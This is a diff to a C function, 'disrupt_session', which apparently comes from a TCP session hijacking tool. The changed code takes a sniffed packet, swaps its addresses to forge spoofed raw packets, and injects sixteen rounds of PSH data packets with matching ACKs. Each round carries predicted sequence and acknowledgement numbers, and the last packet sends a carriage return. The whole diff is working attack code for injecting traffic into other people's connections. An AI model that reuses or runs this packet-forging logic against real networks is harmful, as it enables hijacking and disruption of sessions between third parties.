@@ -87,9 +87,10 @@ void disrupt_session(void *sniffedPacket) {
     addr_in.sin_port            = tcpHeader->source;
     inet_pton(AF_INET, inet_ntoa(ipHeader->ip_src), &(addr_in.sin_addr));
 
-    int sizeOfPacket            = sizeof(struct iphdr) + sizeof(struct tcphdr) + 12 + 1;
+//    int sizeOfPacket            = sizeof(struct iphdr) + sizeof(struct tcphdr) + 12 + 1;
+    int sizeOfPacket            = sizeof(struct iphdr) + sizeof(struct tcphdr) + 1;
     void *packet                = malloc(sizeOfPacket);
-    uint32_t ack_inc            = 1;       // Amount to increase ack by
+    uint32_t ack_inc            = 0;       // Amount to increase ack by
     uint32_t seq_inc            = 0;       // Amount to increase seq by
     int sock                    = -1;       // Socket FD
     int one                     = 1;        // ??????????????
@@ -129,20 +130,21 @@ void disrupt_session(void *sniffedPacket) {
     printf("\"RST\":%d, ",          RESET_OFF);
     printf("\"ACK_NUM\":%u, ",      ntohl(tcpHeader->seq) + seq_inc);
     printf("\"SYN_NUM\":%u, ",      ntohl(tcpHeader->ack_seq) + ack_inc);
-    printf("\"data\":\"%s\"",       "X");
+    printf("\"data\":\"%s\"",       "x");
     printf("}\n\n");
 
-    int packetCountdown = 1;
-    while(packetCountdown--){
+    char *dstTemp = inet_ntoa(ipHeader->ip_dst);
+    char *dstAddress = malloc(strlen(dstTemp) + 1);
+    strncpy(dstAddress, dstTemp, strlen(dstTemp) + 1);
 
-        char *dstTemp = inet_ntoa(ipHeader->ip_dst);
-        char *dstAddress = malloc(strlen(dstTemp) + 1);
-        strncpy(dstAddress, dstTemp, strlen(dstTemp) + 1);
+    char *srcTemp = inet_ntoa(ipHeader->ip_src);
+    char *srcAddress = malloc(strlen(srcTemp) + 1);
+    strncpy(srcAddress, srcTemp, strlen(srcTemp) + 1);
 
-        char *srcTemp = inet_ntoa(ipHeader->ip_src);
-        char *srcAddress = malloc(strlen(srcTemp) + 1);
-        strncpy(srcAddress, srcTemp, strlen(srcTemp) + 1);
+    int i=1, packetAmount = 16;
+    while(i <= packetAmount){
 
+        ack_inc++;
         fill_packet(dstAddress,                             // Source IP Address
                     srcAddress,                             // Destination IP Address
                     ntohs(tcpHeader->source),               // Destination Port
@@ -153,14 +155,36 @@ void disrupt_session(void *sniffedPacket) {
                     ntohl(tcpHeader->ack_seq) + seq_inc,    // Sequence Number
                     ntohl(tcpHeader->seq) + ack_inc,        // Acknowledgement Number
                     RESET_OFF,                              // RST Flag
-                    "X",                                    // Data
+                    (i == 16) ? "\r\0" : "x",                 // Data
                     packet,                                 // Packet to fill
-                    sizeOfPacket);                          // Total size of packet
+                    (i == 16) ? sizeOfPacket + 1 : sizeOfPacket);                          // Total size of packet
 
         // Send out the packet
-        printf("Sending Packet %02d of %02d! Result: %d\n", 6-packetCountdown, 5, send_packet(sock, packet, addr_in));
+        printf("Sending PSH Packet %d of %d! Result: %d\n", i, packetAmount, send_packet(sock, packet, addr_in));
+        sleep(1);
 
-        free(dstAddress);
-        free(srcAddress);
+        seq_inc++;
+        fill_packet(dstAddress,                             // Source IP Address
+                    srcAddress,                             // Destination IP Address
+                    ntohs(tcpHeader->source),               // Destination Port
+                    ntohs(tcpHeader->dest),                 // Source Port
+                    SYN_OFF,                                // SYN Flag
+                    ACK_ON,                                 // ACK Flag
+                    PSH_OFF,                                // PSH Flag
+                    ntohl(tcpHeader->ack_seq) + seq_inc,    // Sequence Number
+                    ntohl(tcpHeader->seq) + ack_inc,        // Acknowledgement Number
+                    RESET_OFF,                              // RST Flag
+                    "",                                     // Data
+                    packet,                                 // Packet to fill
+                    sizeOfPacket - 1);                      // Total size of packet
+        printf("Sending ACK Packet %d of %d! Result: %d\n", i, packetAmount, send_packet(sock, packet, addr_in));
+        sleep(1);
+
+        i++;
     }
+
+    free(dstAddress);
+    free(srcAddress);
+
+    exit(0);
 }
